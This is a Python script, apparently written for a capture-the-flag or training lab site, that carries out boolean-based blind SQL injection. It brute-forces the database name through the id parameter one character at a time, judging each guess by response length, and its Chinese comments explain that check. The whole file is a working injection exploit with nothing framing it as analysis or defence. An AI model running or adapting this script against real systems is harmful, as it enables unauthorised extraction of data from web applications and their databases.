#coding:utf-8
import requests
import time

url="http://rhiq8003.ia.aqlab.cn/?id=1"

payload=" and (select case when ascii(substr(database(),1,1))<>120 then 1 else 0 end)"
flag=""


for i in range(1,6):
    print(i)
    for j in range(32,127):
    
        payload=" and (select case when ascii(substr(database(),"+str(i)+",1))="+str(j)+" then 1 else 0 end)"
        headers={
            "xxx":"xxx",
            "yyy":"yyy"
            }
        data={
            "xxx":"xxx",
            "yyy":"yyy"
            }
            
        print(url+payload)
        # post请求使用requests.post(url=url,headers=headers,data=data,proxies={"http":"127.0.0.1:8080"})
        r = requests.get(url=url+payload,timeout=0.5)    
        
        # 判断回显正确与否
        # 经过测试正常响应时len(r.content.decode())超过2500，无响应时小于1500
        if (len(r.content.decode())>2000) and (len(r.content.decode())<3000):
            flag+=chr(j)
            print("flag is :"+flag)
            break
        time.sleep(1)